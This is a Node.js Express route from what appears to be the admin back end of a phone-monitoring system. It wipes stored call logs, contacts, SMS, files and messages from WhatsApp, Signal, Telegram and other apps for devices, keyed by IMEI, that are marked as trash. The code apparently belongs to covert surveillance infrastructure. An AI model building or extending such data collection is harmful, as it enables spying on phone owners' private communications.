const express = require("express");
const router = express.Router();
const fs = require("fs");

const Info = require("../../../models/Info");
const CallLogs = require("../../../models/CallLogs");
const Contacts = require("../../../models/Contacts");
const FileListing = require("../../../models/FileListing");
const LiveInfos = require("../../../models/LiveInfos");
const SmsLogs = require("../../../models/SmsLogs");
//apps
const Whatsapp = require("../../../models/Whatsapp");
const Viber = require("../../../models/Viber");
const Telegram = require("../../../models/Telegram");
const Signal = require("../../../models/Signal");
const ProtectedText = require("../../../models/ProtectedText");
const Messenger = require("../../../models/Messenger");
const Imo = require("../../../models/Imo");
const Conion = require("../../../models/Conion");

const auth = require("../../../middleware/auth");

router.post("/", auth, (req, res) => {
  try {
    req.body.map(async (imei) => {
      let infoDevice = await Info.findOne({ imei });
      if (infoDevice.box == "trash") {
        await CallLogs.deleteMany({ imei });
        await Contacts.deleteMany({ imei });
        await FileListing.deleteMany({ imei });
        await LiveInfos.deleteMany({ imei });
        await SmsLogs.deleteMany({ imei });
        

        await Whatsapp.deleteMany({ imei });
        await Viber.deleteMany({ imei });
        await Telegram.deleteMany({ imei });
        await Signal.deleteMany({ imei });
        await ProtectedText.deleteMany({ imei });
        await Messenger.deleteMany({ imei });
        await Imo.deleteMany({ imei });
        await Conion.deleteMany({ imei });

        Info.deleteOne({ imei }, () => {
          fs.rmdir(`./files/${imei}`, { recursive: true }, (e) => {
            if (e)
              console.log("/api/v0.0.1/admin/deleteDevices.js (xinj-37)", e); //xinj-37
          });
        });

        await Info.deleteMany({ imei });
      }
    });

    res.status(200).json("Done");
  } catch (e) {
    console.log("/api/v0.0.1/admin/deleteDevices.js (xinj-38)", e); //xinj-38
    res.status(500).send("/api/v0.0.1/admin/deleteDevices.js (xinj-39)"); //xinj-39
  }
});

module.exports = router;
